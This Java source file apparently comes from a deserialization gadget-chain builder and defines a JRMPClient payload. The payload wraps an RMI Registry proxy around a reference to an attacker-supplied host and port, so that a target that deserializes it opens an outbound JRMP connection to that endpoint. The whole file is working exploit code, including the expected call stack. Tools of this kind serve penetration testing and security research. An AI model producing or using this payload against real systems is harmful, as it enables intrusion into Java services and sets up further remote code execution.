package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

@Authors({ Authors.MBECHLER })
@Dependencies({})
@Impact(Impact.JRMPClient)
public class JRMPClient extends GadgetChain<NoTrampoline> {

    public JRMPClient() {
        super(NoTrampoline.getInstance());
    }

    public JRMPClient(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
                Registry.class
        }, obj);

        return new TrampolineConnector(proxy);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getCommandFormat() {
        return "<host>:<port>";
    }

    @Override
    protected String getStackTrace() {
        return "sun.rmi.server.UnicastRef.readExternal()\n"+
                "sun.rmi.transport.LiveRef.read()\n"+
                "sun.rmi.transport.DGCClient.registerRefs()\n"+
                "sun.rmi.transport.DGCClient$EndpointEntry.registerRefs()\n"+
                "sun.rmi.transport.DGCClient$EndpointEntry.makeDirtyCall()\n"+
                "sun.rmi.transport.DGCImpl_Stub.dirty()\n"+
                "sun.rmi.server.UnicastRef.newCall()\n"+
                "sun.rmi.transport.tcp.TCPChannel.newConnection()";
    }
}
